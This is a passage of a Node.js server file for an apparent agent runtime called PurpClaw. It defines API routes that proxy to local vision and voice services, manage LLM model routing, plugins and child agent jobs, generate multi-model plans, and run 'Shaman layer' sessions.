    // POST /api/vision/detect — proxy to the real YOLO service (services/vision/
    // yolo.py on :7779). Body: {image: base64, confidence?: number}. Real
    // detections only — the service returns actual model output or an error.
    if (pathname === '/api/vision/detect' && method === 'POST') {
      (async () => {
        try {
          const body = await parseBody(req);
          const { image, confidence } = body || {};
          if (!image) return sendJson(res, 400, { ok: false, error: 'image (base64) required' });
          const upstream = await fetch('http://127.0.0.1:7779/detect', {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ image, confidence: confidence || 0.25 }),
            signal: AbortSignal.timeout(30000),
          });
          const result = await upstream.json();
          return sendJson(res, upstream.ok ? 200 : 502, { ok: upstream.ok, detector: 'yolov8n@7779', ...result });
        } catch (e) {
          return sendJson(res, 502, { ok: false, error: 'yolo service unreachable: ' + e.message });
        }
      })();
      return;
    }

    // GET /api/vision/status — detector lane health for cockpit + agent tools.
    if (pathname === '/api/vision/status' && method === 'GET') {
      fetch('http://127.0.0.1:7779/health', { signal: AbortSignal.timeout(3000) })
        .then(r => r.json()).then(h => sendJson(res, 200, { ok: true, detector: 'ONLINE', ...h }))
        .catch(() => sendJson(res, 200, { ok: true, detector: 'UNAVAILABLE', hint: 'python services/vision/yolo.py' }));
      return;
    }

    // ========== VOICE LANES (built-in by default) ==========
    // TTS → lib/tts/gateway.js (:7799, Kokoro). STT → services/voice/stt.py
    // (:7896, faster-whisper). Same proxy pattern as /api/vision/detect.

    // GET /api/voice/status — combined TTS+STT health for cockpit/agent.
    if (pathname === '/api/voice/status' && method === 'GET') {
      const probe = (url) => fetch(url, { signal: AbortSignal.timeout(3000) })
        .then(r => r.json()).then(() => 'ONLINE').catch(() => 'UNAVAILABLE');
      Promise.all([probe('http://127.0.0.1:7799/health'), probe('http://127.0.0.1:7896/health')])
        .then(([tts, stt]) => sendJson(res, 200, { ok: true, tts, stt }));
      return;
    }

    // POST /api/tts/speak {text, voice?, blocking?} → Kokoro speaks aloud.
    // POST /api/tts/synthesize {text, voice?} → {audio_b64, mime:'audio/wav'}.
    if ((pathname === '/api/tts/speak' || pathname === '/api/tts/synthesize') && method === 'POST') {
      (async () => {
        try {
          const body = await parseBody(req);
          const text = String((body && body.text) || '').slice(0, 4000);
          if (!text) return sendJson(res, 400, { ok: false, error: 'text required' });
          const upstream = await fetch(`http://127.0.0.1:7799${pathname.replace('/api/tts', '')}`, {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ text, voice: body.voice }),
            signal: AbortSignal.timeout(120000),
          });
          const result = await upstream.json();
          return sendJson(res, upstream.ok ? 200 : 502, { ok: upstream.ok, tts: 'kokoro@7799', ...result });
        } catch (e) {
          return sendJson(res, 502, { ok: false, error: 'tts gateway unreachable: ' + e.message });
        }
      })();
      return;
    }

    // POST /api/stt/transcribe — body: JSON {audio_b64, mime?} or raw audio/* bytes.
    // Returns {text, language, elapsed_sec}.
    if (pathname === '/api/stt/transcribe' && method === 'POST') {
      (async () => {
        try {
          const ct = String(req.headers['content-type'] || '');
          let upstreamBody, upstreamCt;
          if (!ct.includes('json')) {
            upstreamBody = await new Promise((resolve) => {
              const chunks = []; req.on('data', c => chunks.push(c));
              req.on('end', () => resolve(Buffer.concat(chunks)));
            });
            upstreamCt = ct;
          } else {
            const body = await parseBody(req);
            if (!body || !body.audio_b64) return sendJson(res, 400, { ok: false, error: 'audio_b64 required (or raw audio/* body)' });
            upstreamBody = Buffer.from(String(body.audio_b64), 'base64');
            upstreamCt = String(body.mime || 'audio/wav');
          }
          if (!upstreamBody.length) return sendJson(res, 400, { ok: false, error: 'empty audio payload' });
          const upstream = await fetch('http://127.0.0.1:7896/transcribe', {
            method: 'POST',
            headers: { 'content-type': upstreamCt },
            body: upstreamBody,
            signal: AbortSignal.timeout(120000),
          });
          const result = await upstream.json();
          return sendJson(res, upstream.ok ? 200 : 502, { ok: upstream.ok, stt: 'faster-whisper@7896', ...result });
        } catch (e) {
          return sendJson(res, 502, { ok: false, error: 'stt service unreachable: ' + e.message });
        }
      })();
      return;
    }

    if (pathname === '/api/kimi/memory' && method === 'GET') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      return sendJson(res, 200, kimiClient.getSwarmMemory());
    }

    if (pathname === '/api/kimi/memory' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        kimiClient.updateSwarmMemory(body);
        return sendJson(res, 200, { ok: true });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== SHAMAN LAYER ENDPOINTS ==========
    
    // POST /api/llm/plan — plan-then-act mode (Claude Code pattern)
    // Decompose a user goal into a structured plan of steps. The LLM
    // returns a JSON array; we parse it and return a normalized plan
    // for the UI to render with approve/execute buttons.
    //
    // Mode = "single" (default) — one model proposes the plan.
    // Mode = "fanout"   — 3 models propose in parallel, quill merges.
    //
    // context = true   — inject top-5 semantically-relevant code chunks
    //                    into the planner prompt (real codebase grounding).
    // GET /api/llm/models — live model catalog for cockpit/chat selector
    // ?free=1 filters to free-tier only; ?refresh=1 bypasses the 10-min cache.
    if (pathname === '/api/llm/models' && method === 'GET') {
      const llm = require('./lib/llm-provider');
      const url = new URL(req.url, 'http://localhost');
      const refresh = url.searchParams.get('refresh') === '1';
      llm.fetchOpenRouterModels({ force: refresh })
        .then(r => {
          const models = url.searchParams.get('free') === '1' ? llm.freeModels(r.models) : r.models;
          sendJson(res, 200, { ok: true, cached: r.cached, stale: Boolean(r.stale), degraded: false,
            fetchedAt: r.fetchedAt || null, count: models.length, models });
        })
        .catch(e => {
          // CATALOGUE DEGRADE LAW: live fetch failed → serve last-known-good cache
          // marked degraded. Catalogue failure must never 503 the selector or crash chat.
          const stale = llm.lastKnownGoodModels();
          if (stale && stale.length) {
            const models = url.searchParams.get('free') === '1' ? llm.freeModels(stale) : stale;
            safeLog('LLM', `catalogue degraded: ${e.message} — serving ${models.length} cached models`);
            return sendJson(res, 200, { ok: true, cached: true, degraded: true,
              degradedReason: e.message, count: models.length, models });
          }
          sendJson(res, 503, { ok: false, degraded: true, error: e.message });
        });
      return;
    }

    // GET /api/llm/registry — CANONICAL model registry (task 1 of router work
    // order): one schema for every provider, wrapped over the existing catalogs.
    // ?task=VISION|CODE|... applies the hard compatibility gate; ?provider=
    // scopes to one provider.
    if (pathname === '/api/llm/registry' && method === 'GET') {
      const registry = require('./lib/model-registry');
      const url = new URL(req.url, 'http://localhost');
      const task = url.searchParams.get('task');
      const provider = url.searchParams.get('provider');
      // Sampling capability map rides along so the UI builds honest
      // per-route controls (Settings law: only show what a provider accepts).
      const { PROVIDER_CAPABILITIES } = require('./lib/llm-provider.js');
      const p = registry.modelsForTask(task || 'CHAT', provider)
        .then(models => sendJson(res, 200, {
          ok: true,
          count: models.length,
          task: task || 'CHAT',
          taskClasses: registry.TASK_CLASSES,
          capabilities: PROVIDER_CAPABILITIES,
          models,
        }))
        .catch(e => sendJson(res, 500, { ok: false, error: e.message }));
      return;
    }

    if (pathname === '/api/llm/auto-route' && method === 'GET') {
      // Scored router probe endpoint: what WOULD AUTO pick and why?
      const registry = require('./lib/model-registry');
      const router = require('./lib/smart-router');
      const health = require('./lib/provider-health');
      const url = new URL(req.url, 'http://localhost');
      const q = url.searchParams;
      const minCtx = Number(q.get('minContext') || 0) || undefined;
      // Task-class alias law: registry classes are CHAT/CODE/VISION/TOOL_CALL/
      // LONG_CONTEXT/IMAGE_GENERATION/VIDEO_GENERATION/AUDIO — normalize common
      // shorthand (IMGGEN, lowercase) so callers can't silently get an empty pool.
      const _TASK_ALIASES = { IMGGEN: 'IMAGE_GENERATION', IMG: 'IMAGE_GENERATION', VIDEOGEN: 'VIDEO_GENERATION', TOOL: 'TOOL_CALL' };
      const _rawTask = q.get('task') || 'CHAT';
      const _taskClass = _TASK_ALIASES[_rawTask.toUpperCase()] || String(_rawTask).toUpperCase();
      router.selectModel({
        taskClass: _taskClass,
        minContext: minCtx,
        thinkLevel: q.get('think') || 'normal',
        preferFree: q.get('preferFree') !== '0',
        provider: q.get('provider') || undefined,
        pool: q.get('pool') || RR.getRouterState().pool_id || 'global',
      }, health.snapshot())
        .then((r) => sendJson(res, 200, { ok: true, ...r }))
        .catch((e) => sendJson(res, 500, { ok: false, error: e.message }));
      return;
    }

    if (pathname === '/api/llm/health' && method === 'GET') {
      return sendJson(res, 200, require('./lib/provider-health').snapshot());
    }

    // CANONICAL PLUGIN REGISTRY HTTP SURFACE — one registry, served truthfully.
    // GET  /api/plugins            → full list with truthful statuses
    // GET  /api/plugins/ui         → only ENABLED plugins' ui.contributions (Widget Manager feed)
    // POST /api/plugins/enable     {id}  — enable + load now
    // POST /api/plugins/disable    {id}
    // POST /api/plugins/grant      {id, permissions:[...]} — operator grant only
    // POST /api/plugins/revoke     {id, permissions:[...]}
    // POST /api/plugins/reload     — rescan plugin dirs (auto-discovery)
    if (pathname.startsWith('/api/plugins')) {
      const pm = require('./lib/plugin-manager');
      try {
        if (pathname === '/api/plugins' && method === 'GET') {
          const list = pm.list();
          return sendJson(res, 200, { ok: true, count: list.length, plugins: list });
        }
        if (pathname === '/api/plugins/ui' && method === 'GET') {
          const contribs = [];
          for (const p of pm.list()) {
            if (p.status !== 'ENABLED') continue; // never serve UI from unproven plugins
            for (const c of (p.ui && p.ui.contributions) || []) {
              contribs.push({ ...c, plugin: p.id });
            }
          }
          return sendJson(res, 200, { ok: true, contributions: contribs });
        }
        if (pathname === '/api/plugins/permissions' && method === 'GET') {
          return sendJson(res, 200, { ok: true, permissions: pm.PERMISSIONS || [] });
        }
        if (method === 'POST' && (pathname === '/api/plugins/grant' || pathname === '/api/plugins/revoke')) {
          const body = await parseBody(req);
          const id = body && body.id;
          const permissions = body && body.permissions;
          if (!id) return sendJson(res, 400, { ok: false, error: 'missing id' });
          if (!Array.isArray(permissions) || !permissions.length) {
            return sendJson(res, 400, { ok: false, error: 'permissions must be a non-empty array' });
          }
          const result = pathname.endsWith('/grant') ? pm.grant(id, permissions) : pm.revoke(id, permissions);
          return sendJson(res, result && result.ok === false ? 400 : 200, { ok: !!(result && result.ok !== false), id, result });
        }
        if (method === 'POST' && (pathname === '/api/plugins/enable' || pathname === '/api/plugins/disable')) {
          const body = await parseBody(req);
          const id = body && body.id;
          if (!id) return sendJson(res, 400, { ok: false, error: 'missing id' });
          const result = pathname.endsWith('/enable') ? pm.enable(id) : pm.disable(id);
          return sendJson(res, result && result.ok === false ? 404 : 200, { ok: !!(result && result.ok !== false), id, result: result || null });
        }
        if (pathname === '/api/plugins/reload' && method === 'POST') {
          pm.unloadAll();
          pm.load();
          const list = pm.list();
          return sendJson(res, 200, { ok: true, count: list.length, plugins: list });
        }
        return sendJson(res, 404, { ok: false, error: 'unknown plugins route' });
      } catch (e) {
        return sendJson(res, 500, { ok: false, error: e.message });
      }
    }

    // CANONICAL ROUTER STATE — the ONE pin endpoint. GET = current router
    // state; POST {model, provider?} = set MANUAL pin; POST {clear:true} or
    // {mode:'AUTO'} = back to AUTO. Writes the SAME model-override.json that
    // streamChatAuto honors — one router, one store.
    if (pathname === '/api/llm/pin' && method === 'GET') {
      return sendJson(res, 200, { ok: true, router: RR.getRouterState() });
    }
    if (pathname === '/api/llm/pin' && method === 'POST') {
      parseBody(req).then((body) => {
        try {
          if (body.clear || body.mode === 'AUTO') {
            const router = RR.clearPin();
            safeLog('CHAT', `ROUTER_PIN cleared → AUTO`);
            return sendJson(res, 200, { ok: true, router });
          }
          if (!body.model && !body.pool) {
            return sendJson(res, 400, { ok: false, error: 'model required (or {pool}, or {clear:true})' });
          }
          if (body.pool && !body.model) {
            // Explicit AUTO pool selection: global | openrouter_free | nim
            // PIN-API HARDENING (2026-08-26): reject unknown pools at WRITE time —
            // previously they were accepted then failed closed only at routing time.
            const SR = require('./lib/smart-router');
            if (!Object.prototype.hasOwnProperty.call(SR.POOLS, String(body.pool))) {
              return sendJson(res, 400, { ok: false, error: `unknown pool '${body.pool}' — valid: ${Object.keys(SR.POOLS).join(', ')}` });
            }
            const router = RR.setPin(null, null, String(body.pool));
            safeLog('CHAT', `ROUTER_POOL AUTO pool=${router.pool_id}`);
            return sendJson(res, 200, { ok: true, router });
          }
          const router = RR.setPin(body.provider || null, body.model);
          safeLog('CHAT', `ROUTER_PIN MANUAL provider=${router.manual_pin.provider || 'any'} model=${router.manual_pin.model}`);
          return sendJson(res, 200, { ok: true, router });
        } catch (e) {
          return sendJson(res, 500, { ok: false, error: e.message });
        }
      });
      return;
    }
    // PIN-API HARDENING (2026-08-26): explicit clear endpoint — DELETE = back to
    // AUTO/global. Previously clearing required {clear:true} POST or manual file removal.
    if (pathname === '/api/llm/pin' && method === 'DELETE') {
      const router = RR.clearPin();
      safeLog('CHAT', 'ROUTER_PIN cleared via DELETE → AUTO');
      return sendJson(res, 200, { ok: true, router });
    }

    if (pathname === '/api/children' && method === 'GET') {
      // Live child-job board for the cockpit ACTIVE AGENTS view.
      const CJ = require('./lib/child-jobs');
      return sendJson(res, 200, { ok: true, active: CJ.listActive(), limits: CJ.LIMITS });
    }
    if (pathname === '/api/children/create' && method === 'POST') {
      const CJ = require('./lib/child-jobs');
      parseBody(req).then((body) => {
        CJ.create({
          task: body.task, taskClass: body.taskClass || 'CHAT',
          soul: body.soul, thinkLevel: body.thinkLevel,
          providerPin: body.providerPin || undefined, modelPin: body.modelPin || undefined,
          minContext: Number(body.minContext || 0) || 0,
          tools: Array.isArray(body.tools) ? body.tools : [],
          workspace: body.workspace || null, mutating: Boolean(body.mutating),
          parentSessionId: body.sessionId || null,
        }).then((job) => { if (body.autostart !== false) CJ.start(job.job_id);
                           sendJson(res, 200, { ok: true, job }); })
          .catch((e) => sendJson(res, 409, { ok: false, error: e.message }));
      });
      return;
    }
    if (pathname === '/api/children/control' && method === 'POST') {
      const CJ = require('./lib/child-jobs');
      parseBody(req).then((body) => {
        const { jobId, op } = body;
        let r = null;
        try {
          if (op === 'pause') r = CJ.pause(jobId);
          else if (op === 'resume') r = CJ.resume(jobId);
          else if (op === 'cancel') r = CJ.cancel(jobId);
          else if (op === 'cancelAll') r = CJ.cancelAll();
          else if (op === 'reroute') r = CJ.reroute(jobId, { provider: body.provider, model: body.model, thinkLevel: body.thinkLevel });
        } catch (e) { return sendJson(res, 500, { ok: false, error: e.message }); }
        sendJson(res, 200, { ok: Boolean(r), result: r });
      });
      return;
    }

    if (pathname === '/api/children/events' && method === 'GET') {
      // Supervisor chat feed: SSE stream of child-job lifecycle events.
      // lib/events.js has no in-process emitter — it appends to
      // agent_work/trace/events.jsonl (and POSTs to eventbus :7782 which may be
      // down). We tail the trace file: bus-outage-proof, zero new deps.
      const fsMod = require('fs');
      const pathMod = require('path');
      const TRACE = pathMod.join(__dirname, 'agent_work', 'trace', 'events.jsonl');
      res.writeHead(200, {
        'Content-Type': 'text/event-stream; charset=utf-8',
        'Cache-Control': 'no-cache, no-transform',
        'Connection': 'keep-alive',
        'X-Accel-Buffering': 'no',
      });
      res.write(`data: ${JSON.stringify({ type: 'children.feed.hello', timestamp: new Date().toISOString() })}\n\n`);
      let pos = 0;
      try { pos = fsMod.existsSync(TRACE) ? fsMod.statSync(TRACE).size : 0; } catch { pos = 0; }
      let closed = false;
      const pump = () => {
        if (closed) return;
        fsMod.stat(TRACE, (err, st) => {
          if (closed) return;
          if (!err && st.size > pos) {
            const stream = fsMod.createReadStream(TRACE, { start: pos, encoding: 'utf8' });
            let buf = '';
            stream.on('data', (c) => { buf += c; });
            stream.on('end', () => {
              pos += Buffer.byteLength(buf);
              for (const line of buf.split('\n')) {
                if (!line.trim()) continue;
                try {
                  const ev = JSON.parse(line);
                  if (ev.namespace === 'children') res.write(`data: ${JSON.stringify(ev)}\n\n`);
                } catch { /* partial line — skip */ }
              }
            });
          }
        });
      };
      const poll = setInterval(pump, 1000);
      const hb = setInterval(() => { try { if (!closed) res.write(': hb\n\n'); } catch { /* ignore */ } }, 15000);
      req.on('close', () => { closed = true; clearInterval(poll); clearInterval(hb); });
      return;
    }

    if (pathname === '/api/llm/plan' && method === 'POST') {
      // Stream mode: SSE so the UI can show steps as they're generated
      if ((req.headers['accept'] || '').includes('text/event-stream')) {
        return handlePlanStream(req, res);
      }
      // Stream mode: SSE so the UI can show steps as they're generated
      if ((req.headers['accept'] || '').includes('text/event-stream')) {
        return handlePlanStream(req, res);
      }
      try {
        const body = await parseBody(req);
        const { goal, source = 'plan', mode = 'single', models: fanoutModels, context: useContext = true } = body;
        if (!goal) return sendJson(res, 400, { ok: false, error: 'goal required' });

        console.log(`[PLAN ${mode}${useContext ? '+ctx' : ''}] ${goal.substring(0, 120)}`);

        const llm = require('./lib/llm-provider');

        // ── Codebase context: pull top-N relevant chunks ─────────────────────
        // The semantic search index (vectors.bin) gives us real "where is X"
        // answers in ~1s. The plan model sees the actual file paths and
        // snippets, so it can plan against real symbols.
        let codebaseContext = '';
        let contextSources = [];
        if (useContext) {
          try {
            const { searchSemantic } = require('./lib/commands/code');
            const r = await searchSemantic(goal, 5);
            if (r && r.results && r.results.length) {
              contextSources = r.results.map(x => ({ file: x.file, score: x.score }));
              const ctxLines = r.results.map((x, i) => {
                const lines = (x.content || '').split('\n').slice(0, 12).join('\n');
                return `[${i + 1}] ${x.file} (score ${x.score.toFixed(3)})\n${lines}`;
              });
              codebaseContext = `\n\nCodebase context (top ${r.results.length} relevant files from semantic search over the live codebase):\n${ctxLines.join('\n\n')}`;
            }
          } catch (e) {
            console.warn('[PLAN] codebase context failed:', e.message);
          }
        }

        const PLAN_SYSTEM = `You are the PurpClaw planning assistant for the PURPCLAW runtime.
Decompose the user's goal into 3-7 concrete, ordered steps. For each step return a JSON object with:
  - "title": short imperative ("Pull recent training data", "Generate the chart")
  - "command": the actual prompt / kernel goal / tool call to execute
  - "route": one of [chat, kernel, groupchat, research, swarm, mission, code, services, training, autoresearch]
  - "expected": what success looks like (1 sentence)
  - "rationale": 1 sentence explaining why this step is needed

If codebase context is provided, USE IT: reference real file paths, real function names, real existing patterns. Steps should be grounded in the actual codebase, not generic advice.

Respond ONLY with a JSON array of those step objects, no prose, no markdown fences.
Example:
[{"title":"Pull last 24h of training trajectories","command":"purpclaw training export chatml --since=24h","route":"training","expected":"~50-200 ndjson lines on disk","rationale":"Need real trajectories to feed the export step"}]`;

        const userPrompt = goal + codebaseContext;

        // Single-model: cheapest, fastest. Default for quick planning.
        if (mode === 'single') {
          let planText = '';
          try {
            // If the caller passed a model, honor it. Otherwise the
            // default chain (OpenRouter → minimax → local qwen) decides.
            const chatOpts = { maxTokens: 2500, temperature: 0.2 };
            if (Array.isArray(fanoutModels) && fanoutModels[0]) chatOpts.model = fanoutModels[0];
            const resp = await llm.chat([
              { role: 'system', content: PLAN_SYSTEM },
              { role: 'user', content: userPrompt },
            ], chatOpts);
            planText = resp?.content || '';
          } catch (e) {
            return sendJson(res, 502, { ok: false, error: 'llm unreachable: ' + e.message });
          }
          const parsed = parsePlanJson(planText);
          return sendJson(res, 200, {
            ok: true, goal, source, mode,
            raw: planText.slice(0, 4000),
            steps: parsed.steps,
            stepCount: parsed.steps.length,
            parseError: parsed.parseError,
            provider: parsed.provider,
            model: parsed.model,
            contextSources,
            contextInjected: codebaseContext ? true : false,
          });
        }

        // Fanout: 3 independent plans, merged by a "judge" model. The
        // judge sees all three proposals + the goal and picks the best
        // steps in optimal order. This is the multi-model quality lift
        // that gets PurpClaw planning close to Claude Code's plan quality.
        if (mode === 'fanout') {
          const candidates = Array.isArray(fanoutModels) && fanoutModels.length
            ? fanoutModels.slice(0, 5)
            : ['openai/gpt-oss-20b:free', 'z-ai/glm-4.5-air:free', 'google/gemma-4-26b-a4b-it:free'];

          // Phase 1: each model proposes a plan in parallel
          const proposals = await Promise.allSettled(candidates.map(async (model) => {
            const t0 = Date.now();
            try {
              const resp = await llm.chat([
                { role: 'system', content: PLAN_SYSTEM },
                { role: 'user', content: userPrompt },
              ], { maxTokens: 1500, temperature: 0.4, model });
              return { model, ok: true, text: resp?.content || '', elapsed: Date.now() - t0 };
            } catch (e) {
              return { model, ok: false, error: e.message, elapsed: Date.now() - t0 };
            }
          }));

          const succeeded = proposals
            .filter(p => p.status === 'fulfilled' && p.value.ok)
            .map(p => p.value);
          if (succeeded.length === 0) {
            return sendJson(res, 502, {
              ok: false, error: 'all fan-out models failed',
              proposals: proposals.map(p => p.status === 'fulfilled' ? p.value : { error: String(p.reason) }),
              contextSources,
            });
          }

          // Phase 2: judge merges into one plan. Use the first candidate
          // (cheapest, fastest) as the judge.
          const judgeModel = succeeded[0].model;
          const judgePrompt = `You are a senior planner. Three independent AI models have proposed plans for this goal. Your job is to pick the BEST steps from across all three and merge them into a single optimal 3-7 step plan.

Goal: ${goal}

Proposals:
${succeeded.map((p, i) => `--- MODEL ${i + 1} (${p.model}) ---\n${p.text}`).join('\n\n')}

Merge the best steps into a single JSON array. Pick steps that are concrete and dispatchable. Drop duplicates. Reorder for proper dependencies. Each step: {title, command, route, expected, rationale}.

Respond ONLY with a JSON array, no prose.`;

          let mergedText = '';
          try {
            const resp = await llm.chat([
              { role: 'system', content: 'You merge multiple AI plans into the single best plan. Output pure JSON only.' },
              { role: 'user', content: judgePrompt },
            ], { maxTokens: 1800, temperature: 0.1, model: judgeModel });
            mergedText = resp?.content || '';
          } catch (e) {
            // Judge failed — fall back to the first successful proposal
            const fallback = parsePlanJson(succeeded[0].text);
            return sendJson(res, 200, {
              ok: true, goal, source, mode: 'fanout-fallback',
              steps: fallback.steps,
              stepCount: fallback.steps.length,
              parseError: fallback.parseError,
              proposals: succeeded.map(s => ({ model: s.model, elapsed: s.elapsed })),
              judgeError: e.message,
              contextSources,
              contextInjected: codebaseContext ? true : false,
            });
          }
          const parsed = parsePlanJson(mergedText);
          return sendJson(res, 200, {
            ok: true, goal, source, mode: 'fanout',
            raw: mergedText.slice(0, 4000),
            steps: parsed.steps,
            stepCount: parsed.steps.length,
            parseError: parsed.parseError,
            proposals: succeeded.map(s => ({ model: s.model, elapsed: s.elapsed })),
            judge: judgeModel,
            contextSources,
            contextInjected: codebaseContext ? true : false,
          });
        }

        return sendJson(res, 400, { ok: false, error: 'mode must be "single" or "fanout"' });
      } catch (e) { return sendJson(res, 500, { ok: false, error: e.message }); }
    }


    // GET /api/shaman/status - Get Shaman state
    if (pathname === '/api/shaman/status' && method === 'GET') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, shaman.getState());
    }

    // POST /api/shaman/start - Start a trip session
    if (pathname === '/api/shaman/start' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { problem, autoPilot, maxCycles, backend } = body;
        
        if (backend) shaman.config.backend = { ...shaman.config.backend, ...backend };
        if (typeof autoPilot === 'boolean') shaman.config.autoPilot = autoPilot;
        if (typeof maxCycles === 'number') shaman.config.maxCycles = maxCycles;
        
        const result = shaman.start(problem);
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // POST /api/shaman/cycle - Run one trip cycle
    if (pathname === '/api/shaman/cycle' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { userInput } = body;
        
        const result = await shaman.runCycle(userInput);
        
        if (shamanEvaluator) {
          const analysis = shamanEvaluator.analyze(result.message?.content || '');
          const suggestion = shamanEvaluator.suggestPhase(shaman.state.phase, analysis, shaman.state.cycle);
          result.evaluation = { analysis, suggestion };
        }
        
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // POST /api/shaman/nudge - Send a steering nudge
    if (pathname === '/api/shaman/nudge' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { text, type } = body;
        if (!text) return sendJson(res, 400, { error: 'text required' });
        
        const nudge = shaman.addNudge(text, type || 'shaman');
        return sendJson(res, 200, nudge);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // POST /api/shaman/phase - Change phase manually
    if (pathname === '/api/shaman/phase' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { phase } = body;
        if (!phase) return sendJson(res, 400, { error: 'phase required (come_up, peak, comedown, integration, done)' });
        
        const params = shaman.setPhase(phase);
        return sendJson(res, 200, { phase, params });
      } catch (e) { return sendJson(res, 400, { error: e.message }); }
    }

    // POST /api/shaman/integrate - Run integration ceremony
    if (pathname === '/api/shaman/integrate' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const result = await shaman.runIntegration(body.prompt);
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // POST /api/shaman/pause
    if (pathname === '/api/shaman/pause' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, shaman.pause());
    }

    // POST /api/shaman/resume
    if (pathname === '/api/shaman/resume' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, shaman.resume());
    }

    // POST /api/shaman/end
    if (pathname === '/api/shaman/end' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, shaman.end());
    }

    // GET /api/shaman/logs - List saved trip logs
    if (pathname === '/api/shaman/logs' && method === 'GET') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, { logs: shaman.listTripLogs() });
    }

    // GET /api/shaman/logs/:sessionId - Get specific trip log
    if (pathname.match(/^\/api\/shaman\/logs\/.+$/) && method === 'GET') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      const sessionId = pathname.split('/')[4];
      const log = shaman.loadTripLog(sessionId);
      if (!log) return sendJson(res, 404, { error: 'Trip log not found' });
      return sendJson(res, 200, log);
    }

    // POST /api/shaman/parallel - Start parallel trip agents
    if (pathname === '/api/shaman/parallel' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { problem, count, archetypes, tools } = body;
        const numAgents = Math.min(count || 3, 10);
        
        const agents = [];
        const perspectives = [
          'dive deep into the technical architecture',
          'explore the emotional user experience',
          'examine the business value proposition',
          'probe the hidden assumptions',
          'connect to unrelated domains'
        ];
        
        for (let i = 0; i < numAgents; i++) {
          const agentShaman = new (require('./digital_shaman.js').DigitalShaman)({
            backend: shaman.config.backend,
            mcpTools: tools || [],
            autoPilot: false,
            maxCycles: 8
          });
          
          agentShaman.start(problem);
          agentShaman.setPhase(i === 0 ? 'peak' : 'come_up');
          
          if (archetypes && archetypes[i]) {
            const { getArchetypeMask } = require('./shaman_prompts.js');
            agentShaman.addNudge(getArchetypeMask(archetypes[i]), 'archetype');
          }
          
          agents.push({
            id: agentShaman.state.sessionId,
            index: i,
            perspective: perspectives[i % perspectives.length],
            phase: agentShaman.state.phase
          });
        }
        
        return sendJson(res, 200, { 
          sessionId: `parallel_${Date.now()}`,
          problem,
          agentCount: agents.length,
          agents
        });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== END SHAMAN LAYER ENDPOINTS ==========

    sendJson(res, 404, { error: 'Not found', path: pathname });
  } catch (err) {
    // DEFENSIVE: if headers already sent (SSE stream in progress), log and
    // let the SSE handler's own error handling take over rather than crashing.
    if (res.headersSent) {
      console.error('[request-handler] post-SSE error (headers already sent):', err && err.message ? err.message : String(err));
      return;
    }
    sendJson(res, 500, { error: err.message });
  }
});

// ── CRASH CAPTURE — delegated to lib/child-registry.js installCleanup() ───────
// child-registry registers uncaughtException + unhandledRejection FIRST (before
// unified_api.js adds anything else). Those handlers write crash evidence to
// var/crashes/ with PID, type, timestamp, message, and stack — then kill
// children and exit. This ensures crash evidence is ALWAYS persisted even for
// early-boot failures that occur before server.listen() is called.
// ─────────────────────────────────────────────────────────────────────────────

global.__startTime = Date.now();

// Disable HTTP server timeout. The SSE stream is long-lived (up to 10 min for
// approval waits). Node's default serverTimeout closes idle connections after
// ~60-120s of inactivity, which would kill an SSE stream during an approval
// wait even though the cockpit sends periodic header heartbeats. Set to 0 to
// remove the timeout entirely — rely on TCP keepalive and the socket's own
// lifecycle instead.
server.timeout = 0;
// Node's default keepAliveTimeout (5s) closes idle keep-alive connections.
// A long tool-execution phase emits no bytes on the socket while tools run,
// so the connection gets reaped mid-run and the client sees an abrupt
// ConnectionReset. Raise it beyond any plausible quiet window.
server.keepAliveTimeout = 120000;   // 2 min of socket idleness tolerated
server.headersTimeout = 125000;     // must exceed keepAliveTimeout

server.listen(PORT, () => {
  console.log(`[UNIFIED API] Listening on http://localhost:${PORT}`);
  console.log(`[UNIFIED API] SSE stream: http://localhost:${PORT}/api/stream`);
  console.log(`[UNIFIED API] WebSocket: ${xiaozhiLink.url ? 'configured' : 'NOT SET (set XIAOZHI_WS_URL or POST /api/xiaozhi/link)'}`);
  console.log(`[UNIFIED API] Tools: ${require('./lib/tools').list().length} canonical`);
  connectToBridge();
  if (xiaozhiLink.url) connectWS();
  startLocalTcpServer();
  AgentTower.connectToUnifiedApi(PORT);
  // Purge expired approvals on startup and every 5 minutes thereafter so the pile
  // of 207 expired approvals doesn't accumulate indefinitely. Without this, every
  // expired approval stays in pending/ dir forever and pollutes audit views.
